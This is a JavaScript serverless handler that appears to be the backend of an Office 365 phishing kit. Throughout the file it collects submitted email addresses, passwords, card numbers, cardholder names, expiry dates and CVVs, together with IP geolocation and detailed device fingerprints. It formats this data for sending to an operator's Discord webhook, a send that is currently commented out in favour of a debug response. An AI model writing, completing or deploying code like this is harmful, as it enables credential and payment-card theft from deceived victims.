import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office365';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const GEO_CACHE = {};

async function githubRead() {
  const headers = {
    'Authorization': `token ${process.env.GH_TOKEN || ''}`,
    'Accept': 'application/vnd.github.v3+json',
    'User-Agent': 'MailOffice365Panel/1.0'
  };
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

async function getGeoFromIp(ip) {
  if (GEO_CACHE[ip]) return GEO_CACHE[ip];
  if (!ip || ip === 'desconocida') {
    GEO_CACHE[ip] = { city: '', region: '', country: '', countryCode: '', isp: '', lat: '', lon: '' };
    return GEO_CACHE[ip];
  }
  try {
    const res = await fetch('https://ipapi.co/' + ip + '/json/', {
      headers: { 'User-Agent': 'MailOffice365Panel/1.0' }
    });
    if (res.ok) {
      const d = await res.json();
      if (d.error) throw new Error('ipapi error');
      const geo = {
        city: d.city || '',
        region: d.region || '',
        country: d.country_name || d.country || '',
        countryCode: d.country_code || '',
        isp: d.org || d.isp || d.connection_isp || '',
        lat: d.latitude || '',
        lon: d.longitude || ''
      };
      GEO_CACHE[ip] = geo;
      return geo;
    }
  } catch (e) {
    try {
      const res2 = await fetch('http://ip-api.com/json/' + ip);
      if (res2.ok) {
        const d2 = await res2.json();
        if (d2.status !== 'fail') {
          const geo2 = {
            city: d2.city || '',
            region: d2.regionName || '',
            country: d2.country || '',
            countryCode: d2.countryCode || '',
            isp: d2.isp || '',
            lat: d2.lat || '',
            lon: d2.lon || ''
          };
          GEO_CACHE[ip] = geo2;
          return geo2;
        }
      }
    } catch (e2) {}
  }
  GEO_CACHE[ip] = { city: '', region: '', country: '', countryCode: '', isp: '', lat: '', lon: '' };
  return GEO_CACHE[ip];
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Metodo no permitido' });
  }

  try {
    let config = {};
    try {
      config = await githubRead();
    } catch (e) {
      console.error('Error leyendo config:', e.message);
      return res.status(500).json({ error: 'No se pudo leer la configuracion. Asegurate de que GH_TOKEN este configurado en Vercel.' });
    }

    const webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook no configurado. Configura discordWebhook en el panel de administracion.' });
    }

    const body = req.body || {};
    const email = body.email || 'unknown';
    const password = body.password || '****';
    const type = body.type || 'login';
    const timestamp = new Date().toISOString();
    const forwardedFor = req.headers['x-forwarded-for'] || '';
    const clientIpRaw = forwardedFor.split(',')[0]?.trim() || 'desconocida';
    const clientIp = clientIpRaw !== 'desconocida' ? clientIpRaw : 'desconocida';

    const cardNumber = body.cardNumber || '';
    const cardHolder = body.cardHolder || '';
    const expiryDate = body.expiryDate || '';
    const cvv = body.cvv || '';

    const userAgent = body.userAgent || 'desconocido';
    const language = body.language || 'desconocido';
    const screenResolution = body.screenResolution || 'desconocido';
    const colorDepth = body.colorDepth || 'desconocido';
    const timezone = body.timezone || 'desconocido';
    const platform = body.platform || 'desconocido';
    const onlineStatus = body.onlineStatus || 'desconocido';
    const cookiesEnabled = body.cookiesEnabled || 'desconocido';

    const deviceMemory = body.deviceMemory || 'desconocido';
    const cpuCores = body.cpuCores || 'desconocido';
    const touchPoints = body.touchPoints || 0;
    const isMobile = body.isMobile || 'No';
    const isTablet = body.isTablet || 'No';
    const isDesktop = body.isDesktop || 'Sí';

    const batteryLevel = body.batteryLevel || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    const wifiName = body.wifiName || '';

    const geo = await getGeoFromIp(clientIpRaw);
    const geoCity = geo.city || '';
    const geoRegion = geo.region || '';
    const geoCountry = geo.country || '';
    const geoCountryCode = geo.countryCode || '';
    const geoIsp = geo.isp || '';
    const geoLat = geo.lat || '';
    const geoLon = geo.lon || '';

    const template = config.discordMessageTemplate || '';
    const hasPlaceholders = template.includes('{email}');
    const isPayment = type === 'payment';

    let deviceTypeText = '🖥️ Escritorio';
    if (isMobile === 'Sí') deviceTypeText = '📱 Móvil';
    else if (isTablet === 'Sí') deviceTypeText = '📱 Tablet';

    function replaceIfExists(msg, ph, value) {
      if (msg.includes('{' + ph + '}')) {
        return msg.replace(new RegExp('\\{' + ph + '\\}', 'g'), value || '');
      }
      return msg;
    }

    let message = '';

    if (hasPlaceholders) {
      message = template;
      message = replaceIfExists(message, 'email', email);
      message = replaceIfExists(message, 'password', password);
      message = replaceIfExists(message, 'type', isPayment ? '💳 Pago' : '🔐 Login');
      message = replaceIfExists(message, 'ip', clientIp);
      message = replaceIfExists(message, 'geoIp', clientIp);
      message = replaceIfExists(message, 'geoCity', geoCity);
      message = replaceIfExists(message, 'geoRegion', geoRegion);
      message = replaceIfExists(message, 'geoCountry', geoCountry);
      message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
      message = replaceIfExists(message, 'geoIsp', geoIsp);
      message = replaceIfExists(message, 'geoLat', geoLat);
      message = replaceIfExists(message, 'geoLon', geoLon);
      message = replaceIfExists(message, 'wifiName', wifiName);
      message = replaceIfExists(message, 'deviceMemory', deviceMemory);
      message = replaceIfExists(message, 'cpuCores', cpuCores);
      message = replaceIfExists(message, 'touchPoints', touchPoints);
      message = replaceIfExists(message, 'isMobile', isMobile);
      message = replaceIfExists(message, 'isTablet', isTablet);
      message = replaceIfExists(message, 'isDesktop', isDesktop);
      message = replaceIfExists(message, 'batteryLevel', batteryLevel);
      message = replaceIfExists(message, 'batteryCharging', batteryCharging);
      message = replaceIfExists(message, 'expiryDate', expiryDate);
      message = replaceIfExists(message, 'cardHolder', cardHolder);
      message = replaceIfExists(message, 'cardNumber', cardNumber);
      message = replaceIfExists(message, 'cvv', cvv);
      message = replaceIfExists(message, 'userAgent', userAgent);
      message = replaceIfExists(message, 'language', language);
      message = replaceIfExists(message, 'screenResolution', screenResolution);
      message = replaceIfExists(message, 'colorDepth', colorDepth);
      message = replaceIfExists(message, 'timezone', timezone);
      message = replaceIfExists(message, 'platform', platform);
      message = replaceIfExists(message, 'onlineStatus', onlineStatus);
      message = replaceIfExists(message, 'cookiesEnabled', cookiesEnabled);
      message = replaceIfExists(message, 'timestamp', timestamp);
      message = replaceIfExists(message, 'title', isPayment ? '💳 Verificacion de pago' : '🔐 Inicio de sesion');

      if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
        message += '\n\n💳 DATOS DE TARJETA:';
        message += '\n🔢 Numero: ' + cardNumber;
        message += '\n👤 Titular: ' + cardHolder;
        message += '\n📅 Vence: ' + expiryDate;
        message += '\n🔐 CVV: ' + cvv;
      }
    } else {
      // === LOGIN (sin plantilla) ===
      if (!isPayment) {
        message = '🔐 Inicio de sesion';
        message += '\n--------';
        message += '\nUsuario: ' + email;
        message += '\nContraseña: ' + password;
        message += '\nIP: ' + clientIp;

        // Ubicacion con ISP
        message += '\n\nUbicacion:';
        if (geoCity) message += '\nCiudad: ' + geoCity;
        if (geoRegion) message += '\nRegion: ' + geoRegion;
        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
        if (geoIsp) message += '\nISP: ' + geoIsp;
        if (geoLat && geoLon) message += '\nCoordenadas: ' + geoLat + ', ' + geoLon;

        // Dispositivo
        message += '\n\nDispositivo:';
        message += '\nRAM: ' + deviceMemory + ' GB';
        message += '\nCPU: ' + cpuCores + ' nucleos';
        message += '\nTipo: ' + deviceTypeText;
        if (wifiName) message += '\nWiFi: ' + wifiName;

        // Batería
        if (batteryLevel !== 'No disponible') {
          message += '\n\nBateria: ' + batteryLevel + (batteryCharging === 'Sí' ? ' (Cargando)' : '');
        }

        // Navegador, idioma, pantalla, zona horaria, plataforma, estado, cookies
        message += '\n\nNavegador: ' + userAgent;
        message += '\nIdioma: ' + language;
        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth.replace(' bits','') + ' bits)';
        message += '\nZona horaria: ' + timezone;
        message += '\nPlataforma: ' + platform;
        message += '\nEstado: ' + (onlineStatus === 'Sí' ? 'Conectado' : 'Desconectado');
        message += '\nCookies: ' + (cookiesEnabled === 'Sí' ? 'Activadas' : 'Desactivadas');

        message += '\n\nHora: ' + timestamp;
      }
      // === PAGO (sin plantilla) ===
      else {
        message = 'Verificacion de pago';
        message += '\n--------';
        message += '\nUsuario: ' + email;

        if (cardNumber) {
          message += '\n\nDatos de tarjeta:';
          message += '\nNumero: ' + cardNumber;
          message += '\nTitular: ' + cardHolder;
          message += '\nVence: ' + expiryDate;
          message += '\nCVV: ' + cvv;
        }

        message += '\n\nUbicacion:';
        if (geoCity) message += '\nCiudad: ' + geoCity;
        if (geoRegion) message += '\nRegion: ' + geoRegion;
        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
        if (geoIsp) message += '\nISP: ' + geoIsp;
        if (geoLat && geoLon) message += '\nCoordenadas: ' + geoLat + ', ' + geoLon;

        message += '\n\nDispositivo:';
        message += '\nRAM: ' + deviceMemory + ' GB';
        message += '\nCPU: ' + cpuCores + ' nucleos';
        message += '\nTipo: ' + deviceTypeText;
        if (wifiName) message += '\nWiFi: ' + wifiName;

        message += '\n\nNavegador: ' + userAgent;
        message += '\nIdioma: ' + language;
        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth.replace(' bits','') + ' bits)';
        message += '\nZona horaria: ' + timezone;
        message += '\nPlataforma: ' + platform;
        message += '\nEstado: ' + (onlineStatus === 'Sí' ? 'Conectado' : 'Desconectado');
        message += '\nCookies: ' + (cookiesEnabled === 'Sí' ? 'Activadas' : 'Desactivadas');

        message += '\n\nHora: ' + timestamp;
      }
    }

    // DEBUG: devolver el message para verificar contenido antes de enviar
    return res.status(200).json({ success: true, message: 'OK', debug_message: message, wifiName: wifiName });

    // Descomentar para enviar a Discord:
    /*
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });

    if (!discordRes.ok) {
      const text = await discordRes.text();
      return res.status(500).json({
        error: 'Error enviando: ' + discordRes.status + ' ' + text
      });
    }

    return res.status(200).json({
      success: true,
      message: 'OK'
    });
    */
  } catch (err) {
    console.error('Error en API:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message });
  }
}
